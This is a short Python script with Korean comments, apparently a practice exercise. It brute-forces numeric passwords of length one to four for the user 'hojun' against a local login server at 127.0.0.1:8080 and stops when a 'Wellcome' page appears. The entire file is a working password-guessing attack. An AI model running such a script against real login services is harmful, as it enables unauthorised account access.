import requests
import itertools

문자열 = '0123456789'  # 특수 문자는 없다고 가정한다

for 패스워드길이 in range(1, 5):  # 1 - 1~3에서 1~5까지 해볼 것
    for password in itertools.product(문자열, repeat=패스워드길이):
        pw = ''.join(password)
        print(pw)
        로그인패킷 = {'id': 'hojun', 'pw': pw}
        print(로그인패킷)
        
        address = requests.post('http://127.0.0.1:8080', data=로그인패킷)
        if 'Wellcome' in address.text:
            exit()
